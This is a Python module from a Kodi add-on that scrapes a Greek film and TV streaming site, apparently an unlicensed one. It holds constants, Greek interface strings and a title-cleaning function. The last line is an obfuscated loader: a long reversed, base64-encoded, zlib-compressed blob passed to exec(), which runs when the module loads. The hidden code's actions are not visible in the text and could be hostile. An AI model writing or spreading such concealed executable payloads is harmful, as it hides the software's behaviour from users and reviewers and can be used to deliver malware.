# -*- coding: utf-8 -*-

import xbmcgui
import xbmcaddon
import xbmc
import re
import requests
import six, base64
from six import ensure_text

from six.moves.urllib_parse import quote_plus
from resources.lib.modules import client
from resources.lib.modules import control
from resources.lib.modules import views
from resources.lib.modules import dom_parser as dom
from resources.lib.modules.control import addDir
ADDON       = xbmcaddon.Addon()
ADDON_DATA  = ADDON.getAddonInfo('profile')
ADDON_PATH  = ADDON.getAddonInfo('path')
DESCRIPTION = ADDON.getAddonInfo('description')
FANART      = ADDON.getAddonInfo('fanart')
ICON        = ADDON.getAddonInfo('icon')
ID          = ADDON.getAddonInfo('id')
NAME        = ADDON.getAddonInfo('name')
VERSION     = ADDON.getAddonInfo('version')
Lang        = control.lang
Dialog      = xbmcgui.Dialog()
vers = VERSION
ART = ADDON_PATH + "/resources/icons/"
Teniesonline = 'https://tenies-online.best/'

Baseurl = 'https://tenies-online.best/'
Trailer = '[B][COLOR=lime]Τρέιλερ[/COLOR][/B]'
se = 'Αναζήτηση Ταινίας - Τήλ.Σειράς'
page = '[B][COLOR=lime]Επόμενη σελίδα [/COLOR][/B]'
no_name = '[COLOR lime] * [COLOR orange]Δεν υπάρχει διαθέσιμο Link [COLOR lime]*[/COLOR]'
name_rep = 'πατήστε για να δείτε ταινία '

def clear_Title(txt):
    import six
    if six.PY2:
        txt = txt.encode('utf-8', 'ignore')
    else:
        txt = six.ensure_text(txt, encoding='utf-8', errors='ignore')
    txt = re.sub(r'<.+?>', '', txt)
    txt = re.sub(r'var\s+cp.+?document.write\(\'\'\);\s*', '', txt)
    txt = txt.replace("&quot;", "\"").replace('()', '').replace("&#038;", "&").replace('&#8211;', ':').replace('\n', ' ')
    txt = txt.replace("&amp;", "&").replace('&#8217;', "'").replace('&#039;', ':').replace('&#;', '\'').replace('&#8230;', '...')
    txt = txt.replace("&#38;", "&").replace('&#8221;', '"').replace('&#8216;', '"').replace('&#160;', '')
    txt = txt.replace("&nbsp;", "").replace('&#8220;', '"').replace('&#8216;', '"').replace('\t', ' ')
    txt = txt.replace('οσ ', 'ος ').replace('οσ:', 'ος:').replace('ασ ', 'ας ').replace('εσ ', 'ες ').replace('ησ ', 'ης ').replace('εισ ', 'εις ').replace('Τησ ', 'Της ')
    return txt
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
